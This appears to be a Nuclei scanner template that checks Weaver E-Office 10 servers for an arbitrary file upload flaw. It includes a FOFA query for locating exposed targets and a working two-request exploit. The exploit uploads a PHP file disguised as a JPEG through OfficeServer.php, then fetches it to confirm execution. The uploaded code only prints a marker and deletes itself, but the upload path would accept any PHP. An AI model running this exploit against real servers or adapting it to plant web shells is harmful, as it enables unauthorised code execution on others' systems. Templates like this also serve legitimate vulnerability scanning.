id: E-Office-10-OfficeServer-upload

info:
  name: 泛微E-Office-10-OfficeServer 任意文件上传
  author: HuanXiong
  severity: critical
  description: |-
    fofa: body="eoffice10" && body="eoffice_loading_tip"
  reference:
    - 
  tags: File Upload

variables:
  filename: "{{to_lower(rand_base(10))}}"

http:
  - raw:
      - |
        POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
        Content-Length: 395
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
        Accept-Encoding: gzip, deflate
        Connection: close

        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
        Content-Disposition: form-data; name="FileData"; filename="{{filename}}.jpg"
        Content-Type: image/jpeg

        <?php print(pboyjnnrfipmplsukdeczudsefxmywe);unlink(__FILE__);?>
        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
        Content-Disposition: form-data; name="FormData"

        {'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'{{filename}}.php'}
        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--

      - |
        GET /eoffice10/server/public/iWebOffice2015/Document/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 56

    matchers:
      - type: dsl
        name: 文件上传检测
        dsl: 
          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"